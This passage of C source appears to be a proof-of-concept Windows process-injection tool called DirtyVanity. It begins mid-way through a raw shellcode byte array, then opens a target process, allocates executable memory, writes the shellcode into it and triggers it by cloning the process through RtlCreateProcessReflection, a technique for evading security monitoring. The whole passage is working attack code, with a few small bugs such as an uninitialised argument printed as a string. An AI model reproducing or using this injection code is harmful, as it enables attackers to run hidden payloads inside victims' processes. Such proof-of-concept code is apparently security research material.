         0x8d,0x55,0x10,0x48,0x8b,0x8d,0xe8,0x01,0x00,0x00,
         0xff,0x95,0xd0,0x01,0x00,0x00,0x48,0x89,0x85,0xc0,
         0x02,0x00,0x00,0x33,0xd2,0x48,0xc7,0xc1,0xfe,0xff,
         0xff,0xff,0xff,0x95,0xc0,0x02,0x00,0x00,0x48,0x8d,
         0xa5,0x58,0x03,0x00,0x00,0x5f,0x5d,0xc3
       };

DWORD CreateCalcAndGetPid() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed: eror %d\n", GetLastError());
        return 0;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return pi.dwProcessId;
}

int main(int argc, char** argv)
{
    DWORD victimPid;
    char* pidArg;
    if (argc != 2)
    {
        printf("[+] USAGE: DirtyVanity [TARGET_PID_TO_REFLECT]\n");
        printf("[+] No PID provided, creating a new calc.exe process and using its PID.\n");
        victimPid = CreateCalcAndGetPid();
        if (victimPid == 0) {
            printf("[-] Failed to create new calc.exe process.\n");
        }
    }
    else {
      pidArg = argv[1];
      victimPid = atoi(pidArg);
   }
   printf("[+] Got a handle to PID %d successfully\n", victimPid);

    HANDLE victimHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE, TRUE, victimPid);
    if (victimHandle == NULL)
    {
        printf("[-] Error using OpenProcess on PID %d: ERROR %d\n", victimPid, GetLastError());
        return -1;
    }
    printf("[+] Got a handle to PID %s successfully\n", pidArg);

    // allocate spellcode within victim
    DWORD_PTR spellcodeSize = sizeof(spellcode);

    LPVOID baseAddress = VirtualAllocEx(victimHandle, NULL, spellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (baseAddress == NULL)
    {
        printf("[-] Error allocating spellcode with VirtualAllocEx on PID %d: ERROR %d\n", victimPid, GetLastError());
        return -1;
    }
    printf("[+] Allocated space for spellcode in start address: %p\n", baseAddress);

    // write spellcode
    SIZE_T bytess = 0;

    BOOL status = WriteProcessMemory(victimHandle, baseAddress, spellcode, sizeof(spellcode), &bytess);
    if (!status)
    {
        printf("[-] Error writing spellcode with WriteProcessMemory on Explorer.exe: ERROR %d\n", GetLastError());
        return -1;
    }
    printf("[+] Successfully wrote spellcode to victim. About to start the Mirroring\n");

    HMODULE lib = LoadLibraryA("ntdll.dll");
    if (!lib)
    {
        printf("[-] Error loading ntdll.dll: ERROR %d\n", GetLastError());
        return -1;
    }


    RtlCreateProcessReflectionFunc RtlCreateProcessReflection = (RtlCreateProcessReflectionFunc)GetProcAddress(lib, "RtlCreateProcessReflection");
    if (!RtlCreateProcessReflection)
    {
        printf("[-] Error getting RtlCreateProcessReflection address: ERROR %d\n", GetLastError());
        return -1;
    }

    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };

    NTSTATUS reflectRet = RtlCreateProcessReflection(victimHandle, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE, baseAddress, NULL, NULL, &info);
    if (reflectRet != STATUS_SUCCESS) {
        printf("[-] Error Mirroring: NTSTATUS 0x%08X, GetLastError: ERROR %d\n", reflectRet, GetLastError());
        return reflectRet;
    } else {
        printf("[+] Successfully Mirrored to new PID: %lu\n", (uintptr_t)info.ReflectionClientId.UniqueProcess);
    }


    return reflectRet;
}
